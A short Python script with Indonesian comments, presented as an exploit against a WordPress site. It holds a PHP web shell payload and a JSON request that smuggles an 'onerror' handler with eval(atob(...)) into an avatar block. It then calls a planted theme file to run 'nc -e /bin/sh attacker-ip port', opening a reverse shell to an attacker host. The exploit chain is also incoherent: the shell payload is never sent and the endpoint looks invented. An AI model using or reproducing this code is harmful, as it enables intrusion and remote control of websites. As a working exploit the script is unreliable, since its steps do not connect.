import requests

# Payload: Reverse Shell
reverse_shell_payload = '<?php\nif (isset($_GET[\'cmd\'])) {\n    $cmd = $_GET[\'cmd\'];\n    $output = shell_exec($cmd);\n    echo "<pre>$output</pre>";\n}\n?>'

# Fungsi untuk mengirim permintaan HTTP GET
def send_request(url):
    try:
        response = requests.get(url)
        print(response.text)
    except Exception as e:
        print('Error:', e)

# Eksploitasi: Inject Reverse Shell Payload
exploit_url = 'http://example.com/wp-admin/admin-ajax.php?action=rest_core_controller_create_item&collection_name=avatars'
exploit_data = {
    "attributes": {
        "size": 96,
        "userId": 1,
        "style": {
            "border": {
                "color": "red\", \"type\": \"text/css\", \"onerror\": \"eval(atob(this.id))//"
            }
        }
    },
    "content": "Exploited!",
    "blockName": "core/avatar",
    "clientId": "exploited",
    "blockVersion": 1,
    "innerBlocks": []
}

try:
    response = requests.post(exploit_url, json=exploit_data)
    exploit_result = response.json()
    print('Exploit successful:', exploit_result)
    
    reverse_shell_url = 'http://example.com/wp-content/themes/twentytwenty/header.php?cmd=' + \
                        'nc -e /bin/sh attacker-ip port'
    send_request(reverse_shell_url)
except Exception as e:
    print('Exploit failed:', e)
